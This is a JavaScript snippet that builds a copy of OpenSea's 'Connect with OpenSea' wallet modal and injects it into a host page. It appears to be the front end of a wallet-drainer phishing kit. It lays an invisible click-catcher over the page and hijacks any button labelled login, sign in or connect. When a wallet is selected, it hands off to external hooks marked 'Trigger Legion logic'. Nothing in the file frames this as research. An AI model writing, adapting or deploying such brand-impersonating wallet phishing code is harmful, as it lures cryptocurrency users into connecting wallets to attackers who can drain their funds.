(function() {
    'use strict';

    /* ── Exact OpenSea Wallet Connect Modal ── */

    var WALLETS = [
        {
            name: 'MetaMask',
            installed: true,
            icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
            id: 'metamask'
        },
        {
            name: 'Phantom',
            installed: true,
            icon: "https://phantom.app/img/phantom-logo.svg",
            id: 'phantom'
        },
        {
            name: 'MyTonWallet',
            installed: true,
            icon: "https://mytonwallet.io/icon-256.png",
            id: 'mytonwallet'
        },
        {
            name: 'WalletConnect',
            installed: false,
            icon: "https://cryptologos.cc/logos/walletconnect-logo.svg",
            id: 'walletconnect'
        },
        {
            name: 'Base Account',
            installed: false,
            icon: "https://raw.githubusercontent.com/base-org/brand-kit/main/logo/symbol/Base_Symbol_Blue.svg",
            id: 'base'
        }
    ];

    var walletListHTML = WALLETS.map(function(w) {
        var installedHTML = w.installed ? '<div class="os-wallet-tag-installed">Installed</div>' : '';
        return '<button class="os-wallet-item" data-wallet-id="' + w.id + '">' +
            '<div class="os-wallet-item-left">' +
                '<div class="os-wallet-icon-wrapper">' +
                    '<img src="' + w.icon + '" alt="' + w.name + '">' +
                '</div>' +
                '<span class="os-wallet-name">' + w.name + '</span>' +
            '</div>' +
            installedHTML +
        '</button>';
    }).join('');

    var modalHTML = 
        '<div id="os-wallet-overlay" class="os-wallet-overlay">' +
            '<div class="os-wallet-modal">' +
                '<button class="os-wallet-close-btn" id="os-wallet-close">' +
                    '<svg viewBox="0 0 14 14"><path d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"></path></svg>' +
                '</button>' +
                '<div class="os-wallet-header">' +
                    '<div class="os-opensea-logo-container">' +
                        '<img src="https://storage.googleapis.com/opensea-static/Logomark/Logomark-Blue.svg" style="width: 40px; height: 40px;" alt="OpenSea">' +
                    '</div>' +
                    '<h2 class="os-wallet-title">Connect with OpenSea</h2>' +
                '</div>' +
                '<div class="os-wallet-list-container">' +
                    walletListHTML +
                    '<button class="os-wallet-more-options">More Wallet Options</button>' +
                '</div>' +
                '<div class="os-wallet-separator">or continue with email</div>' +
                '<button class="os-wallet-email-btn">' +
                    '<span class="os-wallet-email-text">Continue with email</span>' +
                    '<div class="os-wallet-email-icon">' +
                        '<svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>' +
                    '</div>' +
                '</button>' +
            '</div>' +
        '</div>' +
        '<div id="os-click-catcher"></div>';

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    var overlay = document.getElementById('os-wallet-overlay');
    var closeBtn = document.getElementById('os-wallet-close');
    var clickCatcher = document.getElementById('os-click-catcher');

    function openModal() {
        overlay.classList.add('active');
        document.body.classList.add('os-modal-open');
    }

    function closeModal() {
        overlay.classList.remove('active');
        document.body.classList.remove('os-modal-open');
    }

    clickCatcher.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        openModal();
    });

    closeBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        closeModal();
    });

    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            closeModal();
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') closeModal();
    });

    var walletItems = document.querySelectorAll('.os-wallet-item');
    walletItems.forEach(function(item) {
        item.addEventListener('click', function() {
            var walletId = item.getAttribute('data-wallet-id');
            
            if (clickCatcher) clickCatcher.style.display = 'none';

            // Trigger Legion logic
            if (walletId === 'metamask' && typeof window.customModalClickMetamask === 'function') {
                window.customModalClickMetamask();
            } else if (walletId === 'walletconnect' && typeof window.customModalClickWalletConnect === 'function') {
                window.customModalClickWalletConnect();
            } else if (typeof window.customModalClickDetected === 'function') {
                window.customModalClickDetected(walletId, null);
            }

            var nameEl = item.querySelector('.os-wallet-name');
            var origName = nameEl.textContent;
            nameEl.textContent = 'Connecting...';
            item.style.opacity = '0.6';
            item.style.pointerEvents = 'none';

            setTimeout(function() {
                nameEl.textContent = origName;
                item.style.opacity = '1';
                item.style.pointerEvents = 'auto';
            }, 3000);
        });
    });

    setTimeout(function() {
        document.querySelectorAll('button, a').forEach(function(el) {
            var text = (el.textContent || '').trim().toLowerCase();
            if (text === 'login' || text === 'connect wallet' || text === 'sign in' || text === 'connect') {
                el.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    openModal();
                });
            }
        });
    }, 1000);

})();
